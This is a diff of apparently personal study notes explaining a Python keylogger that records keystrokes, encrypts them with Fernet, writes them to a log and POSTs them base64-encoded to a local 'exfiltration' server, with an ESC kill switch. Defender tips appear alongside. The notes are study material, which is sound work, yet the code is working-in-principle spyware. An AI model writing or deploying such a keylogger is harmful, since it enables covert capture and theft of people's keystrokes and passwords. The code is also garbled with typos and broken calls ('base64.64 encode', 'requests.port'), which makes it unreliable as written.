@@ -26,15 +26,41 @@ Fernet is a symmetric encryption scheme provided by the cryptography library in 
 ->f.write (KEY):saves the key to a file for writing the newly generated key.
 ->fernet = Fernet (KEY):Initializes the zernet encryption/decryption instance with the key.
 ->Log_File = "keys.txt":Sets the filename where encrypted keystore will be stored.
+->KILL_SWITCH=keyboard Key.esc:Sets the ESC key as the kill switch which when pressed will stop logging.
 
-SWITCH
+Note:Malware often has kill switches for testing. Analysts can search for these as potential weak points to terminate execution.
 
-if with keyboard Key.esc sets the ESC key as the kill switch which when pressed will sth lopping.
-
+Writing Encrypted Logs
+Prepare a log entry with timestamp + keystrokes Encrypts it with Fernet.
+Writes encrypted data to file
+Base64 encodes it and exfilterates by POSTING to a server
+Note:I was confused here Log-data is not a pre-defined paramater.It is actually taken that while Calling function we pass the real arguments.
+Code->
+def
+Write_encrypted_logo(log-data):
+      timestamp=datetime.datetime.utconow().isofformat()
+      log = f"{timestamp}:{log_data}\n"
+      enc_log = ferrnet.encrypt (log.encode) 
+      with open (LOG_FILE, "ab") as f:
+           f.write (enc_log +b'\n')
+#simulate exfiltration
+b64_ence_log = base64.64 encode(enc_log).decode()
+requests.port('http://127.0.0.1:5000/recieve'),
+data = {'data': b64_enc_log}
 Note:
+Defenders should monitor Post traffu to unknown servers and scan for encrypted data leaving endpoints.
 
-Melware often har kell switches for testing. Analysts can search for there as potential Weak points to terminate execution.
+Keylogger Listener
+def on_press(key):
+     try:
+        write_encrypted_log(str(key.char))
+     except AttributeError:
+        write_encrypted_log (str(key))
+      if key==KILL_SWITCH:
+           #end listener
+           return False
+Listener=keyboard. Listener(on_press=on_press)
+listener.start()
+listener.join()
+def on_press(key):Defines the callback function that is triggered every time a key is pressed.The key parameter represent the key that was pressed.
 
-writing Encrypted Logs
-
-Drepane
